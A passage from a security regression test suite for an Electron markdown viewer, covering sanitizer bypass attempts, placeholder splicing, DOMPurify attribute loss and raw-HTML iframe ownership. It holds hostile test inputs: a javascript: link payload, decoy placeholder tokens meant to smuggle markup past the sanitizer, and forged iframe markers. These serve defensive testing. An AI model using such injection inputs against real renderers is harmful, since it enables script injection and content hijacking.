          ? [...v.querySelectorAll('img')].filter(
              (i) => (i.getAttribute('src') || '').startsWith('data:image/svg+xml'),
            ).length
          : -1,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "SEC-28 a decoy placeholder cannot splice markup past the sanitizer (light-format path)",
    sec28LightPwned === null &&
      sec28Light.onerror === 0 &&
      sec28Light.srcX === 0 &&
      sec28Light.dataImg === 1 &&
      sec28Light.renderError === null,
    JSON.stringify({ sec28LightPwned, ...sec28Light }),
  );

  // ---------------------------------------------------------------------
  // F43 - placeholder assembly.
  //
  // Both render paths lift mermaid fences and @@@html blocks out of the source,
  // hand the remainder to marked, and splice the real markup back in over a
  // placeholder token. Two defects live in that splice, and this block measures
  // both. Neither is an injection today - every restore runs BEFORE
  // sanitizeHtml() - but both are document-controlled corruption, and one
  // sanitize reorder away from being worse.
  //
  //  (a) The token is a PREDICTABLE LITERAL and the restore rewrites only the
  //      FIRST occurrence (String.replace with a string, and a non-global
  //      RegExp, both stop at one). The token contains no HTML-special
  //      character, so a decoy in a code span survives marked verbatim. If the
  //      decoy comes first, the real block is spliced into the reader's code
  //      span and the genuine token is left on screen as literal text. Same
  //      shape as SEC-28, on a different carrier.
  //
  //  (b) $-EXPANSION, and it reaches the two MERMAID sites only. A replacement
  //      STRING gives $&, $`, $' and $$ their special meaning, and the mermaid
  //      replacement embeds escapeHtml(code) - which does not escape $. The
  //      @@@html sites are immune because rawHtmlIframeMarkup()'s only variable
  //      part is a hash.
  //
  // The two paths spell their tokens DIFFERENTLY (MERMAID_PLACEHOLDER_ /
  // RAWHTML_PLACEHOLDER_ on the full path, MERMAID_PH_ / RAWHTML_PH_ on the
  // light one), so each leg has to plant the token its own path will look for.
  // That divergence is itself the reason a shared helper is the right fix.
  //
  // ORACLE NOTE, and the obvious one is WRONG for the mermaid leg: <pre> is in
  // the set of start tags that close an open <p>, so the parser REPARENTS the
  // spliced pre.mermaid out of the code span. "the diagram ended up inside a
  // <code>" therefore cannot be the test. What survives the reparenting is the
  // damage to the reader's own text: the code span is emptied and the real
  // token is stranded as visible prose. Both are asserted, with the mermaid /
  // iframe counts as positive controls - all three oracles are absence checks,
  // and an absence check fails open.
  const f43Probe = (token) =>
    exec(`
    (() => {
      const v = document.querySelector('#viewer');
      if (!v) return { noViewer: true };
      const tok = ${JSON.stringify(token)};
      const codes = Array.from(v.querySelectorAll('code'));
      const walker = document.createTreeWalker(v, NodeFilter.SHOW_TEXT);
      let stranded = 0;
      for (let n = walker.nextNode(); n; n = walker.nextNode()) {
        if (n.nodeValue.trim() !== tok) continue;
        if (n.parentElement && n.parentElement.closest('code')) continue;
        stranded += 1;
      }
      const mer = Array.from(v.querySelectorAll('pre.mermaid'));
      const frames = Array.from(v.querySelectorAll('iframe.raw-html-block'));
      // The "stranded" counter can only look for a token the TEST can spell, so
      // it is blind to a real placeholder left behind - those carry a
      // per-render nonce the test cannot know. This counts anything SHAPED like
      // one of this file's placeholders instead, which is what a restore that
      // misses a hole leaves in the reader's prose.
      //
      // The character class MUST include the underscore: a real token is
      // MERMAID_BLOCK_<nonce>_<index>_ and the nonce is separated from the
      // prefix by one. A first draft used [A-Za-z0-9]*_? here and matched 0 of
      // 200000 generated real tokens while still matching the nonce-less shape
      // - i.e. it looked like it worked on exactly the one fixture that could
      // not tell the difference.
      const walker2 = document.createTreeWalker(v, NodeFilter.SHOW_TEXT);
      let strandedLike = 0;
      for (let n = walker2.nextNode(); n; n = walker2.nextNode()) {
        if (!/(?:MERMAID|RAWHTML)_[A-Za-z0-9_]*\\d+_/.test(n.nodeValue)) continue;
        if (n.parentElement && n.parentElement.closest('code')) continue;
        strandedLike += 1;
      }
      return {
        codeSpans: codes.length,
        codeText: codes.length ? codes[0].textContent.trim() : null,
        stranded: stranded,
        strandedLike: strandedLike,
        mermaidCount: mer.length,
        mermaidSrc: mer.length ? mer[0].getAttribute('data-mermaid-src') : null,
        mermaidSrcs: mer.map((m) => m.getAttribute('data-mermaid-src')),
        mermaidOuter: mer.length ? mer[0].outerHTML.slice(0, 200) : null,
        frameCount: frames.length,
        // Pins the unwrapParagraph asymmetry: the @@@html restore swallows the
        // <p> marked wraps the lone placeholder in, the mermaid restore never
        // has. Nothing else in either suite observes it, so flipping the flag
        // would leave <p><iframe/></p> with every count and length unchanged.
        frameParent: frames.length ? frames[0].parentElement.tagName : null,
        mermaidParent: mer.length ? mer[0].parentElement.tagName : null,
        srcdocLen: frames.length ? (frames[0].getAttribute('srcdoc') || '').length : -1,
        srcdocLens: frames.map((f) => (f.getAttribute('srcdoc') || '').length),
        renderError: window.__lastRenderError,
      };
    })()
  `);

  const F43_DIAGRAM = "graph TD\n  A[Real] --> B[Diagram]";
  const f43MermaidDecoy = (token) =>
    "# Doc\n\n`" + token + "`\n\n```mermaid\n" + F43_DIAGRAM + "\n```\n";
  const f43RawDecoy = (token) =>
    "# Doc\n\n`" + token + "`\n\n@@@html\n<b>real block</b>\n@@@\n";

  // A body carrying every $-pattern that survives escapeHtml. $' is included
  // deliberately even though escapeHtml rewrites the quote to &#39; first: what
  // then expands is $& rather than $', so the corruption is real but arrives by
  // a different route than the raw pattern suggests.
  const F43_DOLLAR_DIAGRAM = "graph TD\n  A --> B\n%% $` $& $' $$ $1";
  const f43DollarDoc = "# Doc\n\n```mermaid\n" + F43_DOLLAR_DIAGRAM + "\n```\n";

  // The exact placeholders createBlockPlaceholders() would mint if the nonce
  // were dropped but its prefixes kept: `${prefix}` + index + '_'. Written out
  // as literals rather than derived from the product, deliberately - deriving
  // them would make the fixture agree with whatever the product does, which is
  // the one thing a regression test must not do.
  const F43_NONCELESS_MERMAID = "MERMAID_BLOCK_0_";
  const F43_NONCELESS_RAW = "RAWHTML_BLOCK_0_";

  // A second diagram distinguishable from the first, so fixture E can assert
  // WHICH source landed in WHICH <pre> rather than merely counting two of them.
  const F43_SECOND_DIAGRAM = "graph LR\n  C[Second] --> D[Block]";
  const f43MultiDoc =
    "# Doc\n\n```mermaid\n" +
    F43_DIAGRAM +
    "\n```\n\ntext between\n\n@@@html\n<b>first raw</b>\n@@@\n\n```mermaid\n" +
    F43_SECOND_DIAGRAM +
    "\n```\n\nmore text\n\n@@@html\n<b>second raw</b>\n@@@\n";

  for (const leg of [
    { mode: "full", mermaidTok: "MERMAID_PLACEHOLDER_0", rawTok: "RAWHTML_PLACEHOLDER_0" },
    { mode: "light-format", mermaidTok: "MERMAID_PH_0", rawTok: "RAWHTML_PH_0" },
  ]) {
    // The light-format path only engages once something has been rendered, so
    // every light leg is preceded by a full render of a benign document - the
    // same warm-up SEC-28 uses.
    const warm = async () => {
      if (leg.mode === "light-format") await render("# Warm\n\nplain text\n", "full");
    };

    // POSITIVE CONTROL for the mermaid legs' oracle. Both fixture A and
    // fixture C read `data-mermaid-src` back off the restored <pre>, and an
    // oracle that this render path can never satisfy is indistinguishable from
    // a real proof - the harness checks that a revert's `expect` MATCHES, not
    // that the assertion passes at rest (R357). The two paths used to carry the
    // attribute by DIFFERENT mechanisms: the full path re-derived it in JS
    // inside the mermaid.run set-up, while the light path never runs mermaid
    // and relied entirely on the attribute it authored surviving DOMPurify.
    // That private re-derivation is gone - both paths now call
    // restoreMermaidSourceAttributes() after sanitization and nothing else
    // repairs it - which makes this control MORE load-bearing, not less: with
    // one shared mechanism, an oracle nothing can satisfy would be vacuous on
    // both legs at once.
    await warm();
    await render("# Doc\n\n```mermaid\n" + F43_DIAGRAM + "\n```\n", leg.mode);
    const ctl = await f43Probe(leg.mermaidTok);
    check(
      `F43 control: a benign diagram carries its source on this path (${leg.mode})`,
      ctl.mermaidCount === 1 &&
        ctl.mermaidSrc === F43_DIAGRAM &&
        ctl.stranded === 0 &&
        ctl.renderError === null,
      JSON.stringify(ctl),
    );

    await warm();
    await render(f43MermaidDecoy(leg.mermaidTok), leg.mode);
    const a = await f43Probe(leg.mermaidTok);
    check(
      `F43 a decoy mermaid placeholder cannot capture the real diagram (${leg.mode})`,
      a.codeText === leg.mermaidTok &&
        a.stranded === 0 &&
        a.mermaidCount === 1 &&
        a.mermaidSrc === F43_DIAGRAM &&
        a.renderError === null,
      JSON.stringify(a),
    );

    await warm();
    await render(f43RawDecoy(leg.rawTok), leg.mode);
    const b = await f43Probe(leg.rawTok);
    check(
      `F43 a decoy @@@html placeholder cannot capture the real raw-html block (${leg.mode})`,
      b.codeText === leg.rawTok &&
        b.stranded === 0 &&
        b.frameCount === 1 &&
        b.srcdocLen > 0 &&
        b.renderError === null,
      JSON.stringify(b),
    );

    await warm();
    await render(f43DollarDoc, leg.mode);
    const c = await f43Probe(leg.mermaidTok);
    check(
      `F43 a diagram body of $-replacement patterns round-trips verbatim (${leg.mode})`,
      c.mermaidCount === 1 &&
        c.mermaidSrc === F43_DOLLAR_DIAGRAM &&
        c.renderError === null,
      JSON.stringify(c),
    );

    // Fixture D - the decoy a NONCE-LESS product would be vulnerable to.
    //
    // Fixtures A and B write the two HISTORICAL literals, so they guard against
    // reintroducing those exact spellings and nothing else. They are structurally
    // blind to the likelier accident: keeping this fix's prefix but dropping the
    // random part, which mints a token a document can once again author. The
    // decoy below is exactly what `MERMAID_BLOCK_`/`RAWHTML_BLOCK_` yield with no
    // nonce, so it captures the hole the moment the nonce stops being minted and
    // is inert while it is. R529.
    await warm();
    await render(f43MermaidDecoy(F43_NONCELESS_MERMAID), leg.mode);
    const d = await f43Probe(F43_NONCELESS_MERMAID);
    check(
      `F43 a decoy matching the nonce-less token shape cannot capture the real diagram (${leg.mode})`,
      d.codeText === F43_NONCELESS_MERMAID &&
        d.stranded === 0 &&
        d.mermaidCount === 1 &&
        d.mermaidSrc === F43_DIAGRAM &&
        d.renderError === null,
      JSON.stringify(d),
    );

    await warm();
    await render(f43RawDecoy(F43_NONCELESS_RAW), leg.mode);
    const d2 = await f43Probe(F43_NONCELESS_RAW);
    check(
      `F43 a decoy matching the nonce-less raw-html token shape cannot capture the real block (${leg.mode})`,
      d2.codeText === F43_NONCELESS_RAW &&
        d2.stranded === 0 &&
        d2.frameCount === 1 &&
        d2.srcdocLen > 0 &&
        d2.renderError === null,
      JSON.stringify(d2),
    );

    // Fixture E - MORE THAN ONE BLOCK OF EACH KIND IN ONE DOCUMENT.
    //
    // Every F43 fixture above renders exactly one mermaid fence and one @@@html
    // block, so all of them are satisfied by a restore that rewrites only the
    // FIRST occurrence. That is not a hypothetical shape: it is what dropping
    // the `g` flag from the shared regex produces, and it strands every block
    // after the first as inert placeholder text in the reader's document.
    //
    // The coverage this closes is the REMAINDER, not the whole: "FEATURE two
    // identical @@@html blocks both receive their document" already witnessed
    // multiplicity for @@@html on one path (measured - it fails under R531
    // too). What had no witness at all was multiplicity for MERMAID, and
    // neither kind had one on the light path. The two sources are asserted
    // DISTINCTLY rather than merely counted, so a restore that fills the right
    // number of holes with the wrong bodies - the index-arithmetic accident -
    // fails here as well. R531.
    await warm();
    await render(f43MultiDoc, leg.mode);
    // The token argument is a SENTINEL that appears nowhere in the document:
    // the real placeholders here carry a per-render nonce, so `stranded` cannot
    // spell them and `strandedLike` is the oracle that can. Passing the diagram
    // source instead would be wrong twice over - it is not a placeholder, and it
    // legitimately appears as the text of the rendered `pre.mermaid`.
    const e = await f43Probe("F43_SENTINEL_NEVER_RENDERED");
    check(
      `F43 every block is restored, not just the first (${leg.mode})`,
      e.mermaidCount === 2 &&
        e.mermaidSrcs[0] === F43_DIAGRAM &&
        e.mermaidSrcs[1] === F43_SECOND_DIAGRAM &&
        e.frameCount === 2 &&
        e.srcdocLens.length === 2 &&
        e.srcdocLens.every((n) => n > 0) &&
        e.stranded === 0 &&
        e.strandedLike === 0 &&
        e.renderError === null,
      JSON.stringify(e),
    );

    // The `unwrapParagraph` asymmetry itself. Nothing else in either suite
    // observes it: flipping the flag at either @@@html call site leaves
    // <p><iframe/></p>, and frameCount / srcdocLen / mermaidCount are all
    // unchanged, so the whole suite stays green while the DOM shape the
    // renderer's own comment calls load-bearing has changed.
    //
    // Only the iframe half is a real assertion. The mermaid half cannot be got
    // wrong the same way - <pre> is not phrasing content, so the parser closes
    // an open <p> before it regardless of what the restore emits - and it is
    // recorded here as evidence rather than as a claim about the flag.
    //
    // `frameCount > 0` is a vacuity guard, NOT a count: with no frames,
    // frameParent is null and "null !== P" would pass an empty page. It is
    // deliberately not `=== 2`, because that would make this assertion fail
    // under R531 as well and it would then be testing multiplicity - which is
    // fixture E's job - instead of paragraph shape.
    check(
      `F43 the @@@html restore swallows the paragraph marked wrapped it in (${leg.mode})`,
      e.frameCount > 0 && e.frameParent !== "P",
      JSON.stringify({ frameParent: e.frameParent, mermaidParent: e.mermaidParent }),
    );
  }

  // The nonce must be minted PER RENDER, not once per session. Every fixture
  // above is blind to the difference: fixture D pins the nonce-LESS shape, and
  // a session-constant nonce still does not match `MERMAID_BLOCK_0_`, so
  // hoisting mintPlaceholderNonce() to module scope "because entropy per render
  // is wasteful" would leave the whole suite green while destroying the one
  // property the fix is named for - that a document cannot author the token.
  // Two calls, one render, different answers is the whole claim.
  const nonces = JSON.parse(
    await exec(`JSON.stringify([mintPlaceholderNonce(), mintPlaceholderNonce()])`),
  );
  check(
    "the placeholder nonce is minted fresh on every call, not once per session",
    nonces.length === 2 && nonces[0] !== nonces[1] && nonces.every((n) => /^[a-z0-9]+$/.test(n)),
    JSON.stringify(nonces),
  );

  // ---- TWO-DIGIT BLOCK INDICES, at the shared helper directly -------------
  //
  // Every fixture above renders at most two blocks of a kind, so the highest
  // index any of them mints is 1 and the restore pattern's `(\d+)_` is only
  // ever asked to match ONE digit. Reaching a two-digit index through the
  // public render path costs eleven diagrams per leg, which buys nothing the
  // helper cannot show more precisely - so this exercises createBlockPlaceholders
  // itself, in the live renderer page, with no render at all.
  //
  // It is also STRICTLY STRONGER than the page could be, in three ways:
  //
  //  - THE ORACLE IS THE EXACT RESTORED STRING, not a regex extract plus
  //    counts. An extract of `[PAYLOAD-n]` matches just as happily when the
  //    restore leaves a trailing `_` behind after every replacement, which is
  //    precisely what dropping the index terminator does. A full compare
  //    cannot miss it.
  //  - the @@@html half's index-to-payload identity is unobservable in the
  //    page: eleven iframes carry eleven srcdoc documents of near-identical
  //    length, so a DOM fixture can assert only that each was funded, never
  //    WHICH body each received.
  //  - the `unwrapParagraph` shape is a DIFFERENT REGEX (`<p>core</p>|core`,
  //    two capture groups, so the callback reads a different argument), and
  //    only here can the paragraph be shown swallowed for EVERY block rather
  //    than for the first frame the page happens to expose.
  //
  // MEASURED against this same restore, all five index patterns, 12 blocks,
  // both `unwrapParagraph` shapes:
  //
  //   (\d+)_   shipped              0..11 correct, no debris
  //   (\d+?)_  lazy, terminated     0..11 correct, no debris - INERT, so it is
  //                                 deliberately not recorded as a revert
  //   (\d+)    greedy, no term.     0..11 correct, ONE '_' left per block, and
  //                                 the <p> alternative stops matching  (R532)
  //   (\d+?)   lazy, no terminator  10 and 11 both receive BLOCK 1            (R533)
  //   (\d)_    single digit         0..9 restored, 10 and 11 STRANDED         (R538)
  //
  // So the terminator is NOT a mapping guard - the greedy `(\d+)` already makes
  // the ..._1_ / ..._10_ collision unreachable, and laziness alone is inert
  // because the terminator forces the backtrack that recovers the second digit.
  // What the terminator does is end the token cleanly, and that is what R532
  // measures. The three records stay isolated through the SELECTION assertion
  // below, which R532 must leave passing.
  const F43_HELPER_N = 11;
  const f43Helper = JSON.parse(
    await exec(`
    (() => {
      const N = ${F43_HELPER_N};
      const mk = (unwrap) => {
        const ph = createBlockPlaceholders(unwrap ? 'RAWHTML_PROBE_' : 'MERMAID_PROBE_');
        const toks = [];
        for (let i = 0; i < N; i++) toks.push(ph.take('PAYLOAD-' + i));
        const html = unwrap
          ? toks.map((t) => '<p>' + t + '</p>').join('\\n')
          : toks.map((t) => '<pre>' + t + '</pre>').join('\\n');
        // The order the product's OWN builder was called in, recorded as it
        // happens. This is not an extract from the output - it is which block
        // the restore chose for each hole, in document order.
        const chosen = [];
        const out = ph.restore(html, (code) => { chosen.push(code); return '[' + code + ']'; }, unwrap);
        return {
          // POSITIVE CONTROL: the fixture has to actually reach a two-digit
          // index, or an assertion about two-digit indices is vacuous.
          token10: toks[10],
          out: out,
          chosen: chosen,
        };
      };
      return JSON.stringify({ bare: mk(false), unwrapped: mk(true) });
    })()
  `),
  );
  // Built here, from the payloads this test authored, with no reference to what
  // the product produced - the one thing a regression oracle must not do is
  // agree with whatever the product does.
  const f43Payloads = Array.from({ length: F43_HELPER_N }, (_, i) => "PAYLOAD-" + i);
  const f43BareExpected = f43Payloads.map((p) => "<pre>[" + p + "]</pre>").join("\n");
  const f43UnwrapExpected = f43Payloads.map((p) => "[" + p + "]").join("\n");
  check(
    "F43 the shared helper restores every placeholder exactly, two digits included",
    /_10_$/.test(f43Helper.bare.token10) && f43Helper.bare.out === f43BareExpected,
    JSON.stringify({ out: f43Helper.bare.out, token10: f43Helper.bare.token10 }),
  );
  check(
    // The `<p>` wrappers are absent from the expected string: this shape's job
    // is to swallow the paragraph marked wrapped the lone placeholder in, for
    // every block and not just the first. An exact compare pins both halves at
    // once - which block, and what became of its paragraph.
    "F43 the helper's paragraph-unwrapping shape restores exactly, and eats every paragraph",
    /_10_$/.test(f43Helper.unwrapped.token10) &&
      f43Helper.unwrapped.out === f43UnwrapExpected,
    JSON.stringify({ out: f43Helper.unwrapped.out, token10: f43Helper.unwrapped.token10 }),
  );
  check(
    // SELECTION, separately, and it is what keeps the three index records apart.
    // The exact-output assertions above fail for ANY defect in the restore;
    // this one fails only when the WRONG BLOCK is chosen for a hole (or a hole
    // is skipped). Dropping the terminator leaves this passing, which is the
    // difference between R532 and R533/R538 stated as an assertion rather than
    // as evidence.
    "F43 the helper hands each hole its own block, in order, at two-digit indices too",
    JSON.stringify(f43Helper.bare.chosen) === JSON.stringify(f43Payloads) &&
      JSON.stringify(f43Helper.unwrapped.chosen) === JSON.stringify(f43Payloads),
    JSON.stringify({ bare: f43Helper.bare.chosen, unwrapped: f43Helper.unwrapped.chosen }),
  );

  // ---- N18 - DOMPurify deletes the mermaid source attribute for real
  // flowcharts, and it does so on a VALUE SHAPE, not an attribute name ----
  //
  // DOMPurify 3.4.14 drops any attribute whose DECODED value matches
  // /((--!?|])>)|<\/(style|script|title|xmp|textarea|noscript|iframe|noembed|noframes)/i
  // (extracted from the shipped libs/vendor/purify.min.js, not quoted from
  // memory - an earlier draft of this comment truncated the alternation to
  // (style|title) and understated the finding). "-->" is the canonical mermaid
  // flowchart arrow, so data-mermaid-src was being deleted for essentially
  // every real diagram; a diagram body containing "</script" or "</iframe"
  // loses it too. No HTML-level escaping avoids it: escapeHtml() writes --&gt;,
  // the parser decodes it back, and the guard inspects the DECODED value.
  // Adding the name to ADD_ATTR is a no-op for the same reason - the drop is
  // not name-based.
  //
  // The two halves are asserted SEPARATELY on purpose (the R468 precedent).
  // The PREMISE is a fact about the dependency: if a future DOMPurify relaxes
  // that guard the repair becomes unnecessary, and this fails loudly rather
  // than leaving dead code nobody dares remove. The CONSEQUENCE is a fact about
  // the product. A reader seeing only the consequence would credit the repair
  // for something the sanitizer might no longer be doing.
  const n18Premise = await exec(`
    (() => {
      const shape = (escaped) => {
        const out = window.sanitizeHtml(
          '<pre class="mermaid" data-mermaid-src="' + escaped + '">x</pre>');
        const d = document.createElement('div');
        d.innerHTML = out;
        const p = d.querySelector('pre.mermaid');
        return { kept: !!p, attr: p ? p.getAttribute('data-mermaid-src') : null };
      };
      return {
        hasSanitizer: typeof window.sanitizeHtml === 'function',
        arrow: shape('A --&gt; B'),
        plain: shape('A -&gt; B'),
      };
    })()
  `);
  check(
    "N18 premise: DOMPurify deletes a data- attribute whose value decodes to a flowchart arrow",
    n18Premise.hasSanitizer === true &&
      // The ELEMENT survives in both cases - only the attribute is taken, which
      // is what made this invisible: the diagram still rendered.
      n18Premise.arrow.kept === true &&
      n18Premise.plain.kept === true &&
      n18Premise.arrow.attr === null &&
      // Positive control: the same attribute, one dash shorter, is untouched.
      // Without it "the attribute is gone" is equally satisfied by a sanitizer
      // that strips every data- attribute, or by a probe that never authored
      // one - an absence check fails open.
      n18Premise.plain.attr === "A -> B",
    JSON.stringify(n18Premise),
  );

  // Consequence, on BOTH paths. They used to carry the attribute by different
  // mechanisms - the full path was repairing it by accident inside the
  // mermaid.run set-up, the light path had nothing at all - so a single-leg
  // assertion would have reported the light defect as a full-path pass. The
  // accident has since been removed and both paths call the same helper, but
  // they call it from two separate sites, so the two legs still measure two
  // different things (R527 / R528 break one each).
  const N18_ARROW = "graph TD\n  A --> B";
  const N18_PLAIN = "graph TD\n  A[Only one node]";
  for (const mode of ["full", "light-format"]) {
    if (mode === "light-format") await render("# Warm\n\nplain text\n", "full");
    await render("# Doc\n\n```mermaid\n" + N18_ARROW + "\n```\n", mode);
    const arrow = await f43Probe("unused");
    if (mode === "light-format") await render("# Warm\n\nplain text\n", "full");
    await render("# Doc\n\n```mermaid\n" + N18_PLAIN + "\n```\n", mode);
    const plain = await f43Probe("unused");
    check(
      `N18 a flowchart arrow diagram still carries its source after render (${mode})`,
      arrow.mermaidCount === 1 &&
        arrow.mermaidSrc === N18_ARROW &&
        arrow.renderError === null &&
        // The arrow-free diagram is the discriminator. If BOTH legs lose the
        // attribute the repair is missing outright; if only the arrow leg does,
        // the sanitizer's value guard is the mechanism - which is the defect
        // this assertion is named for.
        plain.mermaidCount === 1 &&
        plain.mermaidSrc === N18_PLAIN &&
        plain.renderError === null,
      JSON.stringify({ arrow, plain }),
    );
  }

  // A javascript: URL must not survive, in either path.
  await render("# Doc\n\n[click](javascript:window.__pwned='link')\n", "full");
  const jsLink = await exec(`
    (() => {
      const a = document.querySelector('#viewer a');
      return { href: a ? a.getAttribute('href') : null };
    })()
  `);
  check(
    "SANITIZER javascript: URLs are still stripped from links",
    !jsLink.href || !/^javascript:/i.test(jsLink.href.trim()),
    JSON.stringify(jsLink),
  );

  // Both render paths must agree; a payload blocked on one and not the other is
  // exactly the inconsistency SEC-26 describes.
  check(
    "SEC-26 image alt payload is blocked on the light-format path too",
    (await render(altBreakoutPayload, "light-format")) === null,
    "light-format path executed the image alt payload",
  );
  check(
    "SEC-26 unknown-language code does not execute HTML on the light-format path",
    (await render(unknownFencePayload, "light-format")) === null,
    "light-format path executed a code fence payload",
  );

  // ==========================================================================
  // Raw-HTML frame ownership
  //
  // @@@html documents are attached with setAttribute *after* sanitization, so
  // the only thing stopping arbitrary markdown from picking one up is how the
  // frames are keyed. These pin that: a forged marker must get nothing, and a
  // frame must never keep showing a previous document's content.
  // ==========================================================================

  // Render a real @@@html block and capture the key the renderer assigned.
  await render(
    "# Doc\n\n@@@html\n<p id=owned-marker>owned raw html</p>\n@@@\n",
    "full",
    2200,
  );
  const realKey = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      return f ? { key: f.dataset.rawhtmlKey || null, len: (f.getAttribute('srcdoc')||'').length } : null;
    })()
  `);
  check(
    "FEATURE @@@html frame is keyed by content and receives its document",
    realKey && typeof realKey.key === "string" && realKey.key.length > 0 && realKey.len > 0,
    JSON.stringify(realKey),
  );

  // Same key, but authored directly in markdown in a document that contains no
  // @@@html block at all. The frame must come back empty - if it does not, raw
  // HTML from a previously viewed file is leaking into this one.
  const forged =
    "# Doc\n\n<iframe class=\"raw-html-block\" data-rawhtml-key=\"" +
    String(realKey && realKey.key) +
    "\"></iframe>\n";
  await render(forged, "full", 2200);
  const forgedState = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      const sd = f.getAttribute('srcdoc') || '';
      return { present: true, srcdocLen: sd.length, leaked: sd.includes('owned raw html') };
    })()
  `);
  check(
    "SEC-01 a markdown-authored raw-html marker receives no document",
    forgedState.present === false ||
      (forgedState.srcdocLen === 0 && forgedState.leaked === false),
    JSON.stringify(forgedState),
  );

  // Same document, this time containing the real @@@html block AND a forged
  // marker reusing its key. The key is derived from public content, so an
  // author can always compute it; what must not happen is the forged frame
  // getting a second copy of the block's document.
  const sameRender =
    "# Doc\n\n@@@html\n<p id=owned-marker>owned raw html</p>\n@@@\n\n" +
    "<iframe class=\"raw-html-block\" data-rawhtml-key=\"" +
    String(realKey && realKey.key) +
    "\"></iframe>\n";
  await render(sameRender, "full", 2500);
  const sameRenderState = await exec(`
    (() => {
      const fs = Array.from(document.querySelectorAll('iframe.raw-html-block'));
      return {
        count: fs.length,
        filled: fs.filter(f => (f.getAttribute('srcdoc')||'').includes('owned raw html')).length
      };
    })()
  `);
  check(
    "SEC-01 a forged marker cannot claim a second copy of a block in the same render",
    sameRenderState.count >= 1 && sameRenderState.filled === 1,
    JSON.stringify(sameRenderState),
  );

  // ...but two genuinely identical @@@html blocks must both still render.
  await render(
    "# Doc\n\n@@@html\n<p>twin</p>\n@@@\n\n@@@html\n<p>twin</p>\n@@@\n",
    "full",
    2500,
  );
  const twins = await exec(`
    (() => {
      const fs = Array.from(document.querySelectorAll('iframe.raw-html-block'));
      return {
        count: fs.length,
        filled: fs.filter(f => (f.getAttribute('srcdoc')||'').includes('twin')).length
      };
    })()
  `);
  check(
    "FEATURE two identical @@@html blocks both receive their document",
    twins.count === 2 && twins.filled === 2,
    JSON.stringify(twins),
  );

  // The resize channel is the only way a sandboxed @@@html frame can influence  // the host, and it now identifies the sender by matching event.source against
  // the managed frames. If contentWindow does not match for an opaque-origin
  // srcdoc frame, that check silently kills the feature - so assert the height
  // is actually applied, end to end, rather than trusting the code shape.
  await render(
    "# Doc\n\n@@@html\n<div style=\"height:640px\">tall</div>\n@@@\n",
    "full",
    3500,
  );
  const resized = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      return { present: true, height: parseInt(f.style.height || '0', 10) };
    })()
  `);
  check(
    "FEATURE sandboxed @@@html frame can still report its height to the host",
    resized.present === true && resized.height >= 600,
    JSON.stringify(resized),
  );
  // Since SEC-09 landed this assertion carries a second, heavier job, recorded
  // here because it is not obvious from its name: it is the control for
  // `script-src 'unsafe-inline'`.
  //
  // The height is written by a script buildRawHtmlDocument() appends inside the
  // srcdoc document (renderer.js:260), and an about:srcdoc frame inherits the
  // embedder's CSP. Drop 'unsafe-inline' and that script never runs: no error
  // is logged anywhere, the frame silently stays at its 50px min-height, and
  // every @@@html block in the app is clipped. Verified by reverting the CSP to
  // `script-src 'self'` - this assertion reports height 0.

  // ==========================================================================
  // Local image paths - the sanitizer hook must be narrow
  //
  // Drive-letter and file:///<drive> paths are ordinary usage in a local
  // viewer. UNC and remote file://host paths are not: on Windows an <img>
  // pointing at a remote SMB share is fetched automatically and can hand the
  // user's NTLM credentials to a host named by untrusted markdown.
  // ==========================================================================
  async function readSecurityImageOwner(filePath) {
    return exec(`(() => {
      const tabs = window.CustomTabs;
      const tab = tabs.getActiveTab();
      const state = tab && tabs.__documentState(tab);
      const pageSession = window.getReloadRequestSession();
      const loading = document.getElementById('loadingScreen');
      return {
        id: tab?.id ?? null, path: tab?.filePath ?? null,
        content: tab?.content, original: tab?.originalContent,
        live: window.originalMarkdown, current: window.currentFilePath,
        tabs: tabs.getTabs().map(item => ({ id: item.id, path: item.filePath })),
        descriptor: tabs.getDocumentDescriptor(),
        identity: tabs.getActiveDocumentIdentity(${JSON.stringify(filePath)}, pageSession),
        pageSession, state, markedDirty: tab?.hasUnsavedChanges,
        pending: window.getPendingSaveStatus(),
        heading: document.querySelector('#viewer h1')?.textContent,
        welcome: !!document.querySelector('#viewer .welcome'),
        loading: loading ? loading.classList.contains('active') : null,
        images: Array.from(document.querySelectorAll('#viewer img'), image => ({
          alt: image.getAttribute('alt'), complete: image.complete,
          width: image.naturalWidth, src: image.getAttribute('src'),
          authored: image.getAttribute('data-original-src'),
          noted: !!image.closest('.noted-image'),
        })),
      };
    })()`);
  }

  function securityImageOwnerMatches(owner, filePath, markdown, heading) {
    const identity = owner.identity, descriptor = owner.descriptor;
    return Number.isSafeInteger(owner.id) && owner.id > 0 &&
      owner.tabs.length === 1 && owner.tabs[0].id === owner.id &&
      owner.tabs[0].path === filePath && owner.path === filePath &&
      owner.current === filePath && owner.content === markdown &&
      owner.original === markdown && owner.live === markdown &&
      descriptor?.logicalPath === filePath &&
      descriptor.documentUrl === pathToFileURL(filePath).href &&
      typeof descriptor.ref === "string" && /^[a-f0-9]{64}$/.test(descriptor.ref) &&
      identity?.tabId === owner.id && identity.documentRef === descriptor.ref &&
      typeof owner.pageSession === "string" && owner.pageSession.length > 0 &&
      identity.pageSession === owner.pageSession &&
      Number.isSafeInteger(identity.rendererGeneration) && identity.rendererGeneration > 0 &&
      Number.isSafeInteger(identity.documentGeneration) && identity.documentGeneration > 0 &&
      typeof identity.pathKey === "string" && identity.pathKey.length > 0 &&
      owner.state?.maintained === true && owner.state.dirty === false &&
      owner.state.liveWitnessMatchesContent === true &&
      owner.markedDirty === false &&
      owner.pending.pending === false && owner.pending.count === 0 &&
      owner.heading === heading && owner.loading === false && !owner.welcome;
  }

  async function admitSecurityImageFixture(filePath, markdown, heading, alts, validAlts) {
    const before = await readSecurityImageOwner(filePath);
    const empty = before.tabs.length === 0 && before.id === null &&
      before.current === null && before.descriptor === null && before.identity === null &&
      before.pending.pending === false && before.pending.count === 0 &&
      before.heading !== heading;
    check("SETUP image admission starts without an existing document owner: " + heading,
      empty && win === observedMain && securityDialogGuardsIntact(), JSON.stringify(before));
    if (!empty || win !== observedMain || !securityDialogGuardsIntact()) {
      throw new Error("Image admission has an unexpected owner or dialog guard");
    }
    const allowance = {
      win, contents: win.webContents, frame: win.webContents.mainFrame,
      pageUrl: win.webContents.getURL(), fixture: filePath, markdown, consumed: false,
    };
    chooserAllowance = allowance;
    try {
